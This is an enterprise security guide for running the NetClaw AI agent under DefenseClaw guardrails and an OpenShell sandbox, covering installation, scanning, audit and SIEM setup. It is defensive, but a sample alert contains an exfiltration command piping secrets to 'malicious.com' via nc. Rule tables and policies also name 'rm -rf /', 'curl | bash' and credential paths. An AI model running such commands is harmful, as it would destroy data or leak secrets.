# DefenseClaw + OpenShell Enterprise Security Guide

**DefenseClaw** from Cisco AI Defense + **OpenShell** from NVIDIA provide comprehensive enterprise security for NetClaw. Together they deliver container-based isolation, runtime guardrails, and full audit compliance.

> **Status (spec 167).** The install and guardrail commands below are the ones that
> worked with DefenseClaw 1.0.4 and OpenClaw 2026.10.9 on NetClaw's qualification VM.
> Spec 167 qualified an iN2N Risk in production mode with this setup in observe mode
> (standalone, federated and denied-scope runs); action mode, other DefenseClaw releases
> and the other commands in this guide have not been re-verified by NetClaw.

---

## Table of Contents

1. [Security Stack Overview](#security-stack-overview)
2. [Installation](#installation)
3. [Running NetClaw Securely](#running-netclaw-securely)
4. [OpenShell Sandbox](#openshell-sandbox)
5. [Component Scanning](#component-scanning)
6. [Runtime Guardrails](#runtime-guardrails)
7. [Tool Management](#tool-management)
8. [Audit & Compliance](#audit--compliance)
9. [SIEM Integration](#siem-integration)
10. [Troubleshooting](#troubleshooting)
11. [Quick Reference](#quick-reference)

---

## Security Stack Overview

The NetClaw enterprise security stack combines two technologies:

| Component | Provider | Purpose |
|-----------|----------|---------|
| **OpenShell** | NVIDIA | Container-based sandbox isolation |
| **DefenseClaw** | Cisco AI Defense | Runtime guardrails, scanning, audit |

### Security Features

| Feature | Component | Description |
|---------|-----------|-------------|
| **Container Sandbox** | OpenShell | Docker-based isolation with YAML policies |
| **Component Scanning** | DefenseClaw | Static analysis of skills, MCPs, plugins before execution |
| **CodeGuard Analysis** | DefenseClaw | Detects credentials, eval(), shell commands, SQL injection |
| **LLM Inspection** | DefenseClaw | Monitors prompts and completions for known provider domains, plus [custom providers](#providers-defenseclaw-does-not-know) |
| **Tool Call Inspection** | DefenseClaw | Enforces 6 rule categories on all tool executions |
| **Audit Logging** | DefenseClaw | SQLite database with compliance-ready exports |
| **SIEM Integration** | DefenseClaw | Splunk HEC, OTLP HTTP, webhooks |

### Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│                    NVIDIA OpenShell Sandbox                       │
│              (Docker container with YAML policies)                │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │                      DefenseClaw                            │  │
│  │              (Runtime guardrails + scanning)                │  │
│  │  ┌──────────────────────────────────────────────────────┐  │  │
│  │  │                      NetClaw                          │  │  │
│  │  │           (AI Network Engineering Agent)              │  │  │
│  │  │                                                       │  │  │
│  │  │   ┌─────────┐   ┌─────────┐   ┌─────────┐           │  │  │
│  │  │   │ Skills  │   │  MCPs   │   │ Plugins │           │  │  │
│  │  │   └─────────┘   └─────────┘   └─────────┘           │  │  │
│  │  └──────────────────────────────────────────────────────┘  │  │
│  │                                                             │  │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐        │  │
│  │  │  CodeGuard  │  │  Guardrails │  │   Audit     │        │  │
│  │  │  (Scanning) │  │  (Runtime)  │  │  (Logging)  │        │  │
│  │  └─────────────┘  └─────────────┘  └─────────────┘        │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                   │
│  Isolation: File system, network, process namespaces              │
│  Policies: /etc/openshell/policies/*.yaml                         │
└───────────────────────────────────────────────────────────────────┘
```

OpenShell is optional. For an iN2N Risk in production mode, NetClaw's sandbox control is
**systemd host confinement** of each member (feature 057, specs 165/166), not an OpenShell
container; see [N2N-RISK.md](N2N-RISK.md). DefenseClaw provides the model-guard control.

---

## Installation

### Fresh Install

Install NetClaw first (`./scripts/install.sh`), then run the enable script below. It is
the reviewed path: a pinned DefenseClaw release whose installer is checksum-verified
before it runs.

### Existing Installation

```bash
./scripts/defenseclaw-enable.sh
```

The script:

1. Checks prerequisites, and stops before installing anything if the OpenClaw gateway
   token is a SecretRef object (see [SecretRef gateway token](#known-limitation-secretref-gateway-token)).
2. Backs up `~/.openclaw/config/openclaw.json` and the gateway config `~/.openclaw/openclaw.json`.
3. Downloads `install.sh` and `checksums.txt` for the pinned release into a private
   temporary directory, checks the SHA-256 of `install.sh` against `checksums.txt`, and
   refuses to run it on a mismatch or a missing entry. It then runs
   `bash install.sh --yes --connector openclaw`. The installer keeps a newer OpenClaw; it
   may install OpenClaw if it is absent or older.
4. Runs `defenseclaw init` and `defenseclaw setup guardrail` non-interactively (observe
   mode). Errors are shown and stop the script.
5. Sets `security.mode` to `defenseclaw` in `~/.openclaw/config/openclaw.json`.
6. Prints the remaining steps: custom providers, starting the sidecar, restarting the
   OpenClaw gateway.

| Variable | Default | Effect |
|----------|---------|--------|
| `DEFENSECLAW_VERSION` | `1.0.4` | DefenseClaw release tag to install |
| `DEFENSECLAW_GUARDRAIL_MODE` | `observe` | `observe` or `action` |
| `DEFENSECLAW_REINSTALL` | unset | `1` reinstalls when `defenseclaw` is already present |
| `INSTALL_OPENSHELL` | unset | `1` also installs OpenShell, only with `OPENSHELL_INSTALL_SHA256` set to the SHA-256 of an installer you reviewed |
| `REGISTER_MCPS` | unset | `1` registers the gateway's MCP servers with `defenseclaw mcp set` (not verified on 1.0.4) |
| `NETCLAW_ENABLE_SERVICES` | unset | `1` on a Risk host runs `scripts/in2n-services.py generate` and `enable`, which includes `defenseclaw-sidecar.service` |

### Manual Install

Do not pipe a branch's `install.sh` into a shell. Fetch a release, verify it, then run it:

```bash
# 1. Download the pinned release installer and its checksums
DEFENSECLAW_VERSION=1.0.4
dir=$(mktemp -d) && chmod 700 "$dir"
base=https://github.com/cisco-ai-defense/defenseclaw/releases/download/$DEFENSECLAW_VERSION
curl -fsSL --proto '=https' --tlsv1.2 -o "$dir/install.sh" "$base/install.sh"
curl -fsSL --proto '=https' --tlsv1.2 -o "$dir/checksums.txt" "$base/checksums.txt"

# 2. Verify (must print "install.sh: OK"), read it, then run it
(cd "$dir" && grep -E '[[:space:]]\*?install\.sh$' checksums.txt | sha256sum -c -) \
  && bash "$dir/install.sh" --yes --connector openclaw

# 3. Initialize and install the OpenClaw guardrail plugin (observe mode)
defenseclaw init --connector openclaw --non-interactive --yes --scanner-mode local
defenseclaw setup guardrail --connector openclaw --mode observe --scanner-mode local \
  --detection-strategy regex_only --non-interactive --no-restart

# 4. Start the guardrail sidecar (see "Running NetClaw Securely"), then load the plugin
openclaw gateway restart
```

Then set `security.mode` to `defenseclaw` in `~/.openclaw/config/openclaw.json` (not the
gateway's `~/.openclaw/openclaw.json`, whose schema rejects that key).

OpenShell is optional. To install it, review NVIDIA's installer first and run the copy
you reviewed; the enable script does this only with `INSTALL_OPENSHELL=1` and
`OPENSHELL_INSTALL_SHA256`.

### Prerequisites

| Requirement | Minimum | Check | Required For |
|-------------|---------|-------|--------------|
| Python | 3.10+ | `python3 --version` | DefenseClaw CLI, enable script |
| Node.js | 20+ | `node --version` | OpenClaw and the DefenseClaw plugin |
| curl, sha256sum (or shasum) | any | `curl --version` | Pinned download and verification |
| Docker | Running | `docker info` | OpenShell sandbox only |

The release installer ships prebuilt binaries; the qualification VM had no Go toolchain.

### Verify Installation

```bash
# DefenseClaw CLI and sidecar binary
defenseclaw --version
command -v defenseclaw-gateway

# OpenClaw plugin installed by `setup guardrail`
ls ~/.openclaw/extensions/defenseclaw

# Guardrail proxy listening on loopback :4000 (after the sidecar starts)
ss -ltn 'sport = :4000'

# Sidecar as a durable service (Risk hosts)
systemctl --user status defenseclaw-sidecar.service
```

---

## Running NetClaw Securely

### Option 1: One-Command Secure Startup (Recommended)

The `netclaw-secure-start.sh` script automates the entire enterprise security stack:

```bash
./scripts/netclaw-secure-start.sh
```

This single command:
1. **Ring 1**: Starts NVIDIA OpenShell gateway (container isolation)
2. **Ring 2**: Starts Cisco DefenseClaw gateway (runtime guardrails)
3. **Ring 3**: Creates NetClaw sandbox with latest OpenClaw
4. Migrates your config, API keys, and SOUL files to sandbox
5. Applies network policy (allows Slack, WebEx, LLM APIs, MCPs)

After the script completes:
```bash
# Connect to the secure sandbox
openshell sandbox connect netclaw

# Inside sandbox:
export HOME=/sandbox
openclaw gateway run &
openclaw tui
```

**Commands:**
```bash
./scripts/netclaw-secure-start.sh          # Start everything
./scripts/netclaw-secure-start.sh stop     # Stop sandbox
./scripts/netclaw-secure-start.sh status   # Check all 3 rings
```

### Option 2: Manual Sandbox Mode

For more control, set up each component manually:

```bash
# 1. Start OpenShell gateway (runs K3s cluster in Docker)
openshell gateway start

# 2. Create a NetClaw sandbox
openshell sandbox create netclaw

# 3. Run NetClaw inside the sandbox
openshell run netclaw -- claw
```

**What this provides:**
- Complete file system isolation
- Network namespace isolation
- Process isolation
- YAML-based policy enforcement
- DefenseClaw guardrails active inside sandbox

### Option 2: DefenseClaw Only (Guardrails without Container)

This runs NetClaw with DefenseClaw guardrails but without container isolation. This is
the shape an iN2N Risk uses: members are confined by systemd, and DefenseClaw guards
model traffic.

```bash
# 1. Start the guardrail sidecar durably. On a Risk host:
python3 scripts/in2n-services.py generate   # writes defenseclaw-sidecar.service
python3 scripts/in2n-services.py enable     # when defenseclaw-gateway is on PATH
#    Elsewhere, run defenseclaw-gateway under your service manager.

# 2. Load the DefenseClaw plugin
openclaw gateway restart

# 3. Optional: block instead of log (see Runtime Guardrails)
defenseclaw setup guardrail --connector openclaw --mode action --scanner-mode local \
  --detection-strategy regex_only --non-interactive --no-restart
openclaw gateway restart
```

**What this provides:**
- Runtime guardrails (LLM inspection, tool call inspection)
- Component scanning (skills, MCPs, plugins)
- Audit logging
- No container isolation (runs on host)

### Option 3: Development/Hobby Mode (No Security)

```bash
# Just run OpenClaw directly
openclaw gateway &
claw
```

**Warning:** No security protections. Only use for local development.

---

## OpenShell Sandbox

OpenShell from NVIDIA provides container-based isolation for AI agents.

### Gateway Management

```bash
# Start the gateway (first time creates Docker container)
openshell gateway start

# Check gateway status
openshell gateway status

# Stop the gateway
openshell gateway stop

# Restart gateway
openshell gateway restart
```

### Sandbox Management

```bash
# Create a new sandbox
openshell sandbox create netclaw

# List all sandboxes
openshell sandbox list

# Delete a sandbox
openshell sandbox delete netclaw

# View sandbox logs
openshell logs netclaw
```

### Running Commands in Sandbox

```bash
# Run a single command
openshell run netclaw -- ls -la

# Run NetClaw/claw
openshell run netclaw -- claw

# Run with environment variables
openshell run netclaw --env ANTHROPIC_API_KEY=$ANTHROPIC_API_KEY -- claw
```

### Policy Configuration

Sandbox policies are defined in YAML:

```yaml
# /etc/openshell/policies/netclaw.yaml
name: netclaw
description: NetClaw network automation agent

filesystem:
  allow:
    - /workspace
    - /home/*/netclaw
    - /tmp
  deny:
    - /etc/passwd
    - /etc/shadow
    - ~/.ssh

network:
  allow_outbound:
    - "*.anthropic.com:443"
    - "*.openai.com:443"
    - "api.netbox.io:443"
  deny_outbound:
    - "*:22"  # No SSH from sandbox

resources:
  max_memory: 4Gi
  max_cpu: 2
```

### Network Policies

The secure startup script applies a comprehensive network policy that allows:

| Category | Allowed Endpoints |
|----------|-------------------|
| **Slack** | api.slack.com, wss-*.slack.com, files.slack.com |
| **WebEx** | webexapis.com, api.ciscospark.com |
| **LLM APIs** | api.anthropic.com, api.openai.com |
| **MCPs** | devnet.cisco.com, api.datadoghq.com, api.meraki.com |
| **Cloud** | AWS, Azure, GCP management APIs |
| **DevOps** | GitHub, GitLab, Terraform, Vault |

To modify the policy:
```bash
# View current policy
openshell policy get netclaw

# Apply custom policy
openshell policy set netclaw --policy my-policy.yaml --wait
```

### Troubleshooting OpenShell

```bash
# Check gateway health
openshell doctor

# View gateway logs
openshell logs gateway

# Force restart
openshell gateway stop && openshell gateway start
```

---

## Component Scanning

DefenseClaw scans all components (skills, MCPs, plugins) before execution using CodeGuard static analysis.

### Scan a Skill

```bash
defenseclaw skill scan pyats-health-check
```

**Output:**
```
Scanning skill: pyats-health-check
✓ No HIGH/CRITICAL findings
Status: ALLOWED
```

### Scan an MCP Server

```bash
defenseclaw mcp scan meraki-mcp
```

### Scan a Plugin

```bash
defenseclaw plugin scan custom-tool
```

### Finding Types

CodeGuard detects:

| Type | Severity | Example |
|------|----------|---------|
| `credential` | HIGH | Hardcoded API keys, passwords |
| `eval` | CRITICAL | Dynamic code execution |
| `shell` | HIGH | Shell command injection |
| `sqli` | CRITICAL | SQL injection vulnerabilities |
| `path_traversal` | MEDIUM | Directory traversal attacks |
| `weak_crypto` | MEDIUM | MD5, SHA1 for security |
| `unsafe_deser` | HIGH | Unsafe pickle/yaml loading |

### Auto-Blocking

Components with HIGH or CRITICAL findings are automatically blocked:

```
Scanning skill: bad-skill
✗ HIGH: Hardcoded credential detected
  Location: config.py:15
Status: BLOCKED
```

---

## Runtime Guardrails

Guardrails inspect all LLM calls and tool executions at runtime.

### Modes

| Mode | Behavior |
|------|----------|
| **observe** | Log violations, allow execution (default) |
| **action** | Log violations AND block dangerous operations |

Start in **observe** and check the audit log for a few real turns before switching to
**action**. Observe mode still routes every model call through the proxy, and the proxy
still refuses unknown provider domains in either mode (see below).

### Change Mode

```bash
# Enable blocking mode
defenseclaw setup guardrail --connector openclaw --mode action --scanner-mode local \
  --detection-strategy regex_only --non-interactive --no-restart
openclaw gateway restart

# Return to observe mode
defenseclaw setup guardrail --connector openclaw --mode observe --scanner-mode local \
  --detection-strategy regex_only --non-interactive --no-restart
openclaw gateway restart
```

### How model traffic reaches the guardrail

DefenseClaw 1.x does not add a model provider to OpenClaw. `defenseclaw setup guardrail
--connector openclaw` installs an **OpenClaw plugin** at `~/.openclaw/extensions/defenseclaw`
and registers it in the gateway config (`plugins.allow`, `plugins.entries`,
`plugins.load.paths`). After `openclaw gateway restart` the plugin intercepts each model
request and sends it to the DefenseClaw guardrail proxy on `127.0.0.1:4000` (the
`defenseclaw-gateway` sidecar), with the original provider URL in a header. The proxy
inspects the request and response and forwards to the real provider.

The proxy forwards only to domains in its provider registry: the providers built into the
release, `llm_providers` in `~/.defenseclaw/config.yaml` (managed with `defenseclaw setup
provider`), the host of `llm.base_url`, and the derived `~/.defenseclaw/custom-providers.json`.
Anything else is blocked.

### Providers DefenseClaw does not know

A model call to an unknown provider domain is **blocked fail-closed**: the sidecar logs
`BLOCKED ... passthrough to unknown domain: <host>` and OpenClaw receives a **403**. On
the qualification VM this happened for Ollama Cloud (`ollama.com`). Register the provider
with DefenseClaw's provider command (it writes `llm_providers` in `config.yaml`;
`~/.defenseclaw/custom-providers.json` is derived from it, so do not edit that file):

```bash
defenseclaw setup provider add --name ollama-cloud --domain ollama.com \
  --env-key OLLAMA_API_KEY --profile-id ollama-cloud:default --base-provider-type ollama
defenseclaw setup provider list          # confirm the domain is registered
systemctl --user restart defenseclaw-sidecar   # if the live reload reports the sidecar unreachable
```

`--env-key` names the environment variable that holds the provider key; never pass key
values on the command line. With the provider registered the plugin routed the turn
(`intercepted ollama-cloud/api/chat -> https://ollama.com/api/chat`) and the audit
database recorded the model response. The
enable script prints the provider hosts in your gateway config so you can compare them.

### Known limitation: SecretRef gateway token

DefenseClaw 1.0.x `init` copies `gateway.auth.token` from the OpenClaw gateway config as
is. When the token is a SecretRef object instead of a string, `init` fails with
`gateway defaults: str expected, not dict` (seen on 1.0.4; the same code is in 1.0.5). The
enable script detects this and stops before installing anything; it never prints or
rewrites the token. Either give the gateway a literal token (for example rotate it to a
new random value with your usual OpenClaw procedure, then restart the gateway), or keep
the SecretRef and wait for a DefenseClaw release that resolves it.

### How NetClaw's production posture recognises it

For a Risk with `N2N_RISK_MODE=production`, the model-guard control requires
`security.mode` = `defenseclaw` in `~/.openclaw/config/openclaw.json`, the `defenseclaw`
CLI, the guardrail proxy reachable on loopback `:4000` (`DEFENSECLAW_GUARD_PORT`), and a
guarded model route in the effective OpenClaw config. Either route counts: the DefenseClaw
plugin route above, or a `defenseclaw/<model>` provider whose `baseUrl` is the loopback
guard port. If any part is missing, posture reports `production — DEGRADED (model-guard
missing)` and delegations are refused. Details: [N2N-RISK.md](N2N-RISK.md).

### Rule Categories

Guardrails enforce 6 categories:

| Category | Description | Example Blocked |
|----------|-------------|-----------------|
| `secret` | Credential exfiltration | Sending API keys to external URLs |
| `command` | Shell command execution | `rm -rf /`, `curl | bash` |
| `sensitive-path` | File system access | `/etc/passwd`, `~/.ssh/` |
| `c2` | Command & control | Connections to known malicious IPs |
| `cognitive-file` | AI memory manipulation | Writing to agent state files |
| `trust-exploit` | Prompt injection | Attempts to override system prompts |

### LLM Providers Supported

DefenseClaw inspects prompts/completions for:
- Anthropic (Claude)
- OpenAI (GPT)
- Google (Gemini)
- AWS Bedrock
- Azure OpenAI
- Cohere
- Mistral

The exact list depends on the release's built-in provider registry. Any other provider
needs a [custom provider](#providers-defenseclaw-does-not-know) entry.

---

## Tool Management

Explicitly block or allow specific tools.

### Block a Tool

```bash
defenseclaw tool block delete_file --reason "destructive operation"
```

### Allow a Tool

```bash
defenseclaw tool allow delete_file
```

### List Tool Rules

```bash
defenseclaw tool list
```

**Output:**
```
Blocked Tools:
- delete_file (reason: destructive operation)
- shell_exec (reason: security policy)

Allowed Tools:
- read_file
- list_directory
```

### Wildcard Patterns

```bash
# Block all write operations
defenseclaw tool block "*_write" --reason "read-only policy"

# Block specific MCP tools
defenseclaw tool block "meraki_delete_*" --reason "no deletions"
```

---

## Audit & Compliance

All operations are logged to a SQLite database for compliance.

### View Alerts

```bash
# Recent alerts
defenseclaw alerts

# With limit
defenseclaw alerts --limit 50

# Filter by severity
defenseclaw alerts --severity HIGH
```

### Export for Compliance

```bash
# JSON export
defenseclaw alerts --export json > audit-$(date +%Y%m%d).json

# CSV export
defenseclaw alerts --export csv > audit-$(date +%Y%m%d).csv
```

### Audit Record Fields

| Field | Description |
|-------|-------------|
| `timestamp` | When the event occurred |
| `event_type` | scan, block, alert, allow |
| `component` | skill, mcp, plugin, tool |
| `name` | Component or tool name |
| `severity` | LOW, MEDIUM, HIGH, CRITICAL |
| `category` | Rule category that triggered |
| `details` | Additional context |
| `outcome` | allowed, blocked, observed |

### Database Location

```
~/.defenseclaw/audit.db
```

Query directly with SQLite (DefenseClaw 1.0.4 records model turns, such as
`llm_response` events, in `audit_events`; use `.tables` to check your release):
```bash
sqlite3 ~/.defenseclaw/audit.db "SELECT * FROM audit_events ORDER BY rowid DESC LIMIT 10;"
```

---

## SIEM Integration

Send security events to external SIEM systems in real-time.

### Splunk HEC

```bash
defenseclaw config siem --type splunk \
  --endpoint https://splunk.example.com:8088 \
  --token $SPLUNK_HEC_TOKEN
```

### OTLP (OpenTelemetry)

```bash
defenseclaw config siem --type otlp \
  --endpoint https://otel-collector.example.com:4318
```

### Webhook Notifications

```bash
# Slack
defenseclaw config webhook --slack $SLACK_WEBHOOK_URL

# PagerDuty
defenseclaw config webhook --pagerduty $PD_ROUTING_KEY

# Webex
defenseclaw config webhook --webex $WEBEX_WEBHOOK_URL

# Generic webhook
defenseclaw config webhook --url https://hooks.example.com/security
```

### Event Format

Events are sent in OCSF-compatible format:
```json
{
  "time": "2026-04-16T10:30:00Z",
  "severity": "HIGH",
  "category": "secret",
  "component": "tool",
  "name": "shell_exec",
  "outcome": "blocked",
  "details": {
    "command": "curl secrets.txt | nc malicious.com 1234"
  }
}
```

---

## Troubleshooting

### "defenseclaw: command not found"

Add to shell profile:
```bash
export PATH="$HOME/.local/bin:$PATH"
```

### `defenseclaw init` fails: "gateway defaults: str expected, not dict"

The OpenClaw gateway token is a SecretRef object. See
[Known limitation: SecretRef gateway token](#known-limitation-secretref-gateway-token).

### Model calls return 403 after enabling the guardrail

The proxy blocked a provider domain it does not know (sidecar log:
`BLOCKED ... passthrough to unknown domain`). Register the provider with
`defenseclaw setup provider add` ([Providers DefenseClaw does not know](#providers-defenseclaw-does-not-know))
and restart the sidecar.

### Gateway won't start

1. Check port availability (4000 is the guardrail proxy):
   ```bash
   lsof -i :4000
   ```

2. Check logs:
   ```bash
   tail -f ~/.defenseclaw/logs/gateway.log
   ```

3. Restart manually:
   ```bash
   defenseclaw-gateway restart
   ```

### Component falsely blocked

1. Check the finding:
   ```bash
   defenseclaw skill scan <name> --verbose
   ```

2. If false positive, add exception:
   ```bash
   defenseclaw exception add <component> --finding <id>
   ```

### SIEM events not arriving

1. Test connectivity:
   ```bash
   defenseclaw config siem --test
   ```

2. Check webhook logs:
   ```bash
   defenseclaw alerts --type webhook-failure
   ```

### Performance issues

Adjust scan timeout:
```bash
defenseclaw config set scan.timeout 30  # seconds
```

---

## Quick Reference

### Running Securely (Quick Start)

```bash
# Full sandbox mode (recommended)
openshell gateway start
openshell sandbox create netclaw
openshell run netclaw -- claw

# Or guardrails only (no container): start the sidecar, then
openclaw gateway restart
claw
```

### OpenShell Commands

```bash
# Gateway
openshell gateway start                  # Start gateway
openshell gateway status                 # Check status
openshell gateway stop                   # Stop gateway

# Sandbox
openshell sandbox create <name>          # Create sandbox
openshell sandbox list                   # List sandboxes
openshell sandbox delete <name>          # Delete sandbox
openshell run <name> -- <cmd>            # Run in sandbox
openshell logs <name>                    # View logs

# Diagnostics
openshell doctor                         # Health check
openshell --version                      # Version
```

### DefenseClaw Commands

```bash
# Installation & Setup
defenseclaw --version                    # Check version
defenseclaw init --connector openclaw --non-interactive --yes --scanner-mode local

# Component Scanning
defenseclaw skill scan <name>            # Scan a skill
defenseclaw mcp scan <name>              # Scan an MCP
defenseclaw plugin scan <name>           # Scan a plugin

# Tool Management
defenseclaw tool block <tool> --reason   # Block a tool
defenseclaw tool allow <tool>            # Allow a tool
defenseclaw tool list                    # List rules

# Guardrails (add --scanner-mode local --detection-strategy regex_only
#   --non-interactive --no-restart, then: openclaw gateway restart)
defenseclaw setup guardrail --connector openclaw --mode observe  # Logging only
defenseclaw setup guardrail --connector openclaw --mode action   # Blocking mode

# Audit & Alerts
defenseclaw alerts                       # View alerts
defenseclaw alerts --export json         # Export JSON
defenseclaw alerts --severity HIGH       # Filter by severity

# Configuration
defenseclaw config siem --type splunk    # Setup SIEM
defenseclaw config webhook --slack URL   # Setup webhook
```

### File Locations

| Path | Purpose |
|------|---------|
| `~/.local/bin/openshell` | OpenShell CLI |
| `~/.local/bin/defenseclaw` | DefenseClaw CLI |
| `~/.local/bin/defenseclaw-gateway` | DefenseClaw gateway |
| `~/.defenseclaw/` | DefenseClaw home |
| `~/.defenseclaw/audit.db` | Audit database |
| `~/.defenseclaw/config.yaml` | DefenseClaw config |
| `~/.defenseclaw/custom-providers.json` | Extra provider domains, derived from `llm_providers` (edit with `defenseclaw setup provider`) |
| `~/.openclaw/extensions/defenseclaw` | DefenseClaw OpenClaw plugin |
| `~/.config/systemd/user/defenseclaw-sidecar.service` | Durable sidecar unit (Risk hosts) |
| `/etc/openshell/policies/` | OpenShell policies |

### Configuration File

```yaml
# ~/.defenseclaw/config.yaml
guardrail:
  mode: observe  # or action
  rules:
    secret: true
    command: true
    sensitive-path: true
    c2: true
    cognitive-file: true
    trust-exploit: true

scan:
  timeout: 10
  auto_block: true
  severity_threshold: HIGH

siem:
  type: splunk
  endpoint: https://splunk.example.com:8088
  token: ${SPLUNK_HEC_TOKEN}

webhooks:
  - type: slack
    url: ${SLACK_WEBHOOK_URL}
```

---

## Related Documentation

- [Upgrade Guide](UPGRADE-TO-DEFENSECLAW.md) - For existing users
- [Security Principles](SOUL-DEFENSE.md) - Security posture guidance
- [DefenseClaw GitHub](https://github.com/cisco-ai-defense/defenseclaw) - Source code and issues
